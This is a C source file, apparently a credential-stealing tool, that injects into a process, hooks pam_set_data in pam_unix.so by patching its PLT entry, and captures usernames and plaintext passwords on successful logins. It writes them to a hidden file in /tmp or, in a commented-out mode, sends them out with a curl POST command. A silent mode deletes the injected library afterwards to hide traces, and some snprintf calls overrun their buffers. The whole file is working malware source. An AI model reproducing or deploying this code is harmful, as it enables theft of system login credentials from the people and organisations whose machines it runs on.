#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <elf.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <assert.h>
#include<dlfcn.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#define MAX_BUF_SIZE 1024
#define MAX_PATH 255
__attribute__ ((constructor)) static int so_init(void);
int SEND_MODE = 0; // 0 = output to file, 1= command mode
char SEND_TARGET[MAX_PATH] = "/tmp/.password.txt";// 如果SEND_MODE = 0 ，则会将密码写入这个目录下，如果
char EVILSOPATH[] = "/tmp/hello.so";
//int SEND_MODE = 1; // 0 = output to file, 1= command mode
//char SEND_TARGET[MAX_PATH] = "curl -X POST -d 'username=%s&password=%s' http://127.0.0.1";
int SLIENT_MODE = 0; // 0 = disable , 1 = enable
char SLIENT_USER[] = "anyone"; // 开启slientmode后，如果设置为anyone则抓到任意用户密码就自删除退出，否则则判断用户名是否与
                             // 当前值相同，相同则销毁退出

struct pam_handle {
    char *authtok;
    unsigned caller_is;
    struct pam_conv *pam_conversation;
    char *oldauthtok;
    char *prompt;                /* for use by pam_get_user() */
    char *service_name;
    char *user;
    char *rhost;
    char *ruser;
    char *tty;
    char *xdisplay;
    char *authtok_type;          /* PAM_AUTHTOK_TYPE */
    /*
    struct pam_data *data;
    struct pam_environ *env;
    struct _pam_fail_delay fail_delay;
    struct pam_xauth_data xauth;
    struct service handlers;
    struct _pam_former_state former;
    const char *mod_name;
    int mod_argc;
    char **mod_argv;
    int choice;

#ifdef HAVE_LIBAUDIT
    int audit_state;
#endif
    int authtok_verified;
    char *confdir;
    */
};


void* get_module_base(pid_t pid, const char* module_name)
{
    FILE* fp;
    long addr = 0;
    char* pch;
    char filename[32];
    char line[MAX_BUF_SIZE];

    // 格式化字符串得到 "/proc/pid/maps"
    if(pid < 0){
        snprintf(filename, sizeof(filename), "/proc/self/maps");
    }else{
        snprintf(filename, sizeof(filename), "/proc/%d/maps", pid);
    }

    // 打开文件/proc/pid/maps，获取指定pid进程加载的内存模块信息
    fp = fopen(filename, "r");
    if(fp != NULL){
        // 每次一行，读取文件 /proc/pid/maps中内容
        while(fgets(line, sizeof(line), fp)){
            // 查找指定的so模块
            if(strstr(line, module_name)){
                // 分割字符串
                pch = strtok(line, "-");
                // 字符串转长整形
                addr = strtoul(pch, NULL, 16);
                break;
            }
        }
    }
    fclose(fp);
    return (void*)addr;
}

struct rel_info {
    uint64_t rel_plt_addr;
    uint32_t rel_plt_size;
    uint64_t str_tab_addr;
    uint64_t sym_tab_addr;
    uint32_t rel_type;
};

struct dynamice_segment {
    Elf64_Dyn *addr;
    uint32_t size;
};

static int get_dyn_section(void *base_addr, struct dynamice_segment *dyn);
static void get_rel_info(Elf64_Dyn *dynamic_table, uint32_t dynamic_size, struct rel_info *info);
static void update_entry(uint64_t *addr, uint64_t *old_entry, uint64_t target_entry);

static int hook_entry (void *base_addr,
                const char *func_name,
                uint64_t *old_entry,
                uint64_t target_entry)
{
    struct dynamice_segment dyn;
    struct rel_info info;

    get_dyn_section(base_addr, &dyn);
    get_rel_info(dyn.addr, dyn.size, &info);

    Elf64_Rela *rel_table = (Elf64_Rela *)info.rel_plt_addr;
    Elf64_Sym *sym_table = (Elf64_Sym *)info.sym_tab_addr;
    char *str_table = (char *)info.str_tab_addr;

    for(int i = 0;i < info.rel_plt_size / sizeof(Elf64_Rela);i++)
    {
        uint32_t number = ELF64_R_SYM(rel_table[i].r_info);
        uint32_t index = sym_table[number].st_name;
        char* func_name2 = &str_table[index];

        if(strcmp(func_name, func_name2) == 0)
        {

            uint64_t *addr = (uint64_t *)(rel_table[i].r_offset + base_addr);

            update_entry(addr, old_entry, target_entry);
            break;
        }
    }


    return 0;
}

static int get_dyn_section(void *base_addr, struct dynamice_segment *dyn)
{
    if (base_addr == NULL || dyn == NULL) {
        return 0;
    }

    //计算program header table实际地址
    Elf64_Ehdr *header = (Elf64_Ehdr*)(base_addr);
    if (memcmp(header->e_ident, "\177ELF", 4) != 0) {
        return -1;
    }

    Elf64_Phdr* phdr_table = (Elf64_Phdr*)(base_addr + header->e_phoff);
    if (phdr_table == 0) {
        return -1;
    }
    size_t phdr_count = header->e_phnum;


    //遍历program header table，ptype等于PT_DYNAMIC即为dynameic，获取到p_offset
    for (int j = 0; j < phdr_count; j++)
    {
        if (phdr_table[j].p_type == PT_DYNAMIC)
        {
            dyn->addr = (Elf64_Dyn *)(phdr_table[j].p_vaddr + (uint64_t)base_addr);
            dyn->size = phdr_table[j].p_memsz;
            break;
        }
    }
    return 0;
}

static void get_rel_info(Elf64_Dyn *dynamic_table, uint32_t dynamic_size, struct rel_info *info)
{
    if (info == NULL) {
        return;
    }

    for(int i = 0;i < dynamic_size / sizeof(Elf64_Dyn);i ++)
    {
        uint64_t val = dynamic_table[i].d_un.d_val;
        if (dynamic_table[i].d_tag == DT_JMPREL)
        {
            info->rel_plt_addr = dynamic_table[i].d_un.d_ptr;
        }
        if (dynamic_table[i].d_tag == DT_STRTAB)
        {
            info->str_tab_addr = dynamic_table[i].d_un.d_ptr;
        }
        if (dynamic_table[i].d_tag == DT_PLTRELSZ)
        {
            info->rel_plt_size = dynamic_table[i].d_un.d_val;
        }
        if (dynamic_table[i].d_tag == DT_SYMTAB)
        {
            info->sym_tab_addr = dynamic_table[i].d_un.d_ptr;
        }
        if (dynamic_table[i].d_tag == DT_PLTREL)
        {
            // DT_RELA = 7
            // DT_REL = 17
            info->rel_type = dynamic_table[i].d_un.d_val;
        }
    }
}

static void update_entry(uint64_t *addr, uint64_t *old_entry, uint64_t target_entry)
{
    // 获取当前内存分页的大小
    uint64_t page_size = getpagesize();
    // 获取内存分页的起始地址（需要内存对齐）
    uint64_t mem_page_start = (uint64_t)addr & (~(page_size - 1));
    mprotect((void *)mem_page_start, page_size, PROT_READ | PROT_WRITE | PROT_EXEC);
    if (old_entry != NULL) {
        *old_entry = *addr;
    }
    *addr = target_entry;
}


typedef int (*FuncPamSetData)(struct pam_handle *, const char *, void *,void* );


static FuncPamSetData old_pam_set_data = NULL;

int my_pam_set_data(struct pam_handle *pamh, const char *module_data_name, void *data,void* cleanup)
{

        char unix_setcred_return[] = "unix_setcred_return";
        if(strstr(unix_setcred_return,module_data_name)){
            if(SEND_MODE == 0){
                FILE *fp = NULL;
                fp = fopen(SEND_TARGET, "a+");
                //fprintf(fp,"pam module_data_name: %s %d\n",module_data_name,*(int *)data);
                int ret = *(int*)data;
                if(ret == 0){
                        fprintf(fp,"login successful username is : %s    password is: %s\n",pamh->user,pamh->authtok);
                }
                fclose(fp);
                
            }else{
                int ret = *(int*)data;
                if(ret == 0){
                    char message[1024];    
                    snprintf(message,2048,SEND_TARGET,pamh->user,pamh->authtok);
                    system(message);
                }
            }
            int ret = *(int*)data;
            if(SLIENT_MODE == 1 && ret == 0){
                    if (strstr(SLIENT_USER,"anyone"))
                    {
                        char cmd[1024];
                        snprintf(cmd,2048,"rm %s",EVILSOPATH);
                        system(cmd);
                    }
                    if (strstr(SLIENT_USER,pamh->user))
                    {
                        char cmd[1024];
                        snprintf(cmd,2048,"rm %s",EVILSOPATH);
                        system(cmd);
                    } 
            }
        
        }
    return old_pam_set_data(pamh,module_data_name,data,cleanup);
}


int so_init(void)
{
    
    void* base_addr = get_module_base(getpid(), "pam_unix.so");
    void *handle = dlopen(EVILSOPATH,RTLD_NOW);
    void *export_pam_set_data = dlsym(handle,"my_pam_set_data");
    hook_entry(base_addr, "pam_set_data", (uint64_t *)&old_pam_set_data, (uint64_t)export_pam_set_data);

    return 0;
}
